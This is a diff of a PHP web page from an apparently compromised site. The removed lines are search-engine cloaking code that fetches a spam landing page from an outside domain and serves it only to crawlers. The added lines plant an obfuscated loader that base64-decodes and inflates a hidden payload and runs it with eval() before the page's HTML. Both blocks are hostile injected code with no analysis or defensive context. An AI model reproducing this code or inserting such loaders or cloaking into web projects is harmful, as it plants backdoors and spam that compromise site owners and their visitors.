@@ -1,30 +1,7 @@
 <?php
-ob_start();
-header("Vary: User-Agent");
-$bot_url = "https://picucur.xyz/landing/journal-unublitar/";
-$botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
-function lph_requests($url)
-{
-    if (function_exists("curl_init")) {
-        $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, $url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
-        $response = curl_exec($ch);
-        curl_close($ch);
-        return $response;
-    } elseif (ini_get("allow_url_fopen")) {
-        return file_get_contents($url);
-    }
-    return false;
-}
-if (preg_match($botchar, $ua)) {
-    usleep(rand(100000, 200000));
-    echo lph_requests($bot_url);
-    ob_end_flush();
-    die;
-}
+$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
+$Lix = "\x3d\x3d\x41N\x41\x638zifvhST97yfELpXFLDsfv\x63d45r\x62HX4pHsdVGvD8J4\x4293\x2bxwqTg0M\x41i2s7\x63yLjeKi46jFdqkJ\x41HYlOPZ3ML6qLW2uDP\x63GopGiRM2jJXgVL71fYm9KOtY\x414NeG\x43\x41yX6mHHjfGYI6Q\x63nU\x63R\x411l\x43M6J8hS4QIgG4NqPHLP9O\x63gFlmw\x42tgoNl/pN\x42Q4sQpqjDF0qwJW8Po/qzvXSgP3XhfEeWvP18gn4pFRhIyqe\x63ztvvF\x62J2uVGFd\x63oPJIrM8JXX/lHfXHi8yISq0RMIVTJXXD4Ez49\x41gNTS8\x42mZDViz98\x4183xGUEwD3Y\x43m\x2bI\x2byTEeVr\x2b9\x61G4Y\x62Sn\x62EUY4nSgITS5PZJdt/ofSudV/0\x2biw3umyv8njyXVtVMVdT4iw6OIIqsN3Gi1\x438E3\x62\x43OvjJkWnz65GKg7lv\x42GrF4qdh\x42\x638hY8KiP91uGftf14LoxxlglONy\x41\x419\x42Rvn2JWpG8mr2ZO\x63/4\x42\x62JHzhfXFh9U\x2b375tO\x2bgPxP88q\x61M2fvknlV/IYojEeDkqMDTtmwE\x61udgvZTtG2lEeqXXvp\x41lWg3gX9mnuMd6GMRtS1j\x63Ors5yM/\x63PmPvMx23SWuYSOMzvh7iRkk5J\x62p7hx\x62\x62WI\x41\x414UsyLsJdqq9Il4\x435UppEyyJ\x62w/T7r9\x43\x42MU/WTT1o/sEw0\x42wJe\x2bHS\x41eHg/\x63Ew4\x42wJe\x2bHR\x41uHg/MEw8\x42wJe\x2bHQ\x41\x2bHQ/8Lw\x41\x42wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 ?>
 
 <!DOCTYPE html>
